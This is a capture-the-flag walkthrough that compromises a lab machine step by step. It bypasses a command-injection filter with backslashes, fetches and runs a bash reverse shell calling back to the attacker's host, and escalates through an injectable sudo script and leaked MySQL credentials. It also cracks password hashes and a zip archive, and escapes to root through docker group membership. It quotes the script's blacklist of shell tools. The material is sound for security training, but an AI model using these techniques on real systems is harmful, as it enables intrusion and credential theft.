# Capture The Flag Challenge 2

## Description

Capture The Flag.

## Sources

```
Explore and discover possible vulnerabilities of the machine to gain access and capture the Flags.
```

## Exploit

Begin by enumerating the IP. 

```
sudo nmap -sC -sV -A -p- <IP>
```

Using `nmap` we discover that port 21, 22 and 80 are opened, so let’s enumerate those ports.

```
ftp <IP>
```

Using the `anonymous` user and `blank` password we gain access to the ftp server. Inside it, we discover a file named note.txt.

Download the file to your machine, and we find that two users namely Anurodh and Apaar are talking about filtering of strings that are being put in a command. Meaning that maybe some of our commands maybe filtered by the web application, and we might get false negatives.

```
get note.txt
```

Next we enumerate HTTP. By accessing the webpage and exploring, we discover that robots.txt doesn't exist. 

So we'll be using `gobuster` to enumerate the website.
 
```
sudo gobuster dir -u http://<website_ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

We discover a few directories, but the one that pops out the most is the `/secret` one.

Inside it, we find an index.php file that can execute commands.

Trying to execute a ls to get a directory listing, we get an error message.
If we remember the note we got from ftp, it says that there was filtering  around some words in the commands.
 
The simplest way to bypass any filtering in command injection is by using backslashes.

So long as we're not escaping any special characters, then the word will still be interpreted the same way by bash.

We try to execute ls again but this time,  we put a backlash between l and s.

```
l\s  -la
```

We have successfully bypassed the filtering.
Next we decide to take a look at the PHP file running the commands and see what other words were blacklisted by the script.

```
c\at index.php
```

And looking at the source we can see the words that are filtered by the script: `nc, python, bash,php,perl,rm,cat,head,tail,python3,more,less,sh,ls`.

These words are mostly used to get reverse shells on any system. But we now have a way to bypass those restriction. 

Next let’s get a shell on the server.

We create a bash reverse shell on script, containing the following command.

+ shell.sh

```
bash -c "bash -i >& /dev/tcp/<host_ip>/9001 0>&1"
```

Next we start an HTTP web server, and then a netcat listener.

```
python3 -m http.server 8000 --bind <host_ip>
```

```
nc -nvlp 9001
```

Then we download the script using curl and piped its contents over to bash using the command below.

```
curl <host_ip>:8000/shell.sh | ba\sh
```

Going back to my netcat listener, we have a shell.


Next we can upgrade the shell to get a full tty shell on the server.

On the server run:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then CTRL + Z, and execute the following comand on host machine terminal.

```
stty raw -echo;fg
```

Press enter, and execute the following commands.

```
stty rows 29 columns 126

export TERM=screen
```

And done, we have a stabel shell.

By exploring we discover that there is a port exposed only to localhost, and that we have access to home directory of appar user.

```
ss -tlpn
```

Inside the home directory of appar, there is a script called .helpline.sh, that can be executed without knowing the user’s passwords.

Looking at the source code of the script, we discover that it’s vulnerable to command injection.

The user’s supplied input is directly passed to a bash instance, and we could use this to our advantage and execute a bash shell to get a bash instance as the user Apaar.

```
sudo -u apaar /home/apaar/.helpline.sh
```
As input we type:

```
/bin/bash
```

The we execute `python3 -c 'import pty; pty.spawn("/bin/bash")'` again.

We have successfully escalated our privileges from the Apache user (www-data).

Next we could drop a SSH key on the server and use SSH to do a reverse tunneling of the port we want to access back to on the server.

Create a SSH key pair using `ssh-keygen` binary from Linux, and copy the public key to the authorized_keys file on the server apaar’s .ssh folder.

Then we use the argument -L in SSH to perform a reverse port forwarding.

```
ssh -L 9001:127.0.0.1:9001 -i apaar apaar@<IP>
```

Next using a browser, we access `127.0.0.1:9001` and discover a customer portal.

By exploring some more, we discover that the directory hosting the second web server was in `/var/www/files/`.

Looking at the account.php we can see that the script performs raw SQL queries without doing any proper filtering or sanitization on user input, and this leads to SQL Injection vulnerability on the website.

Looking at the index.php we get the root’s password to MySQL server.

```
"root","!@m+her00+@db"
```

With these credentials we can access MYSQL through the terminal.

```
mysql -u root -p
```

Now that we're inside, let's explore a bit.

```
show databases;

use webportal;

show tables;

select * from users;
```

Now that we have the passwords hashes, we can use an online md5 decoder to decipher them.

```
Aurick  masterpassword
cullapaar dontaskdonttell
```

After that we can login into the website.

Looking at the hackers.php file we get a hint and a picture.

Downloaded the image to the host machine, and using `steghide` we are able to identify an embedded file.

```
steghide info ./hacker-with-laptop_23-2147985341.jpg
```

Using the following command we can extract the embedded file.

```
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
```

With `john (the ripper)` we can crack the password `pass1word` and extract its contents.

```
sudo zip2john ./backup.zip > hash 
sudo john hash --fork=4 -w=/path/to/rockyou.txt
```

Looking at the source code we have a base64 encoded credentials and a username Anurodh.

```
!d0ntKn0wmYp@ssw0rd
```

We decrypt the password and escalate our privileges.

```
su - anurodh
```

Running an id command we see that we are in the docker group

Using the following one liner below from `GTFOBins` we get a root shell.

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

bash
```

AND WE ARE ROOT!!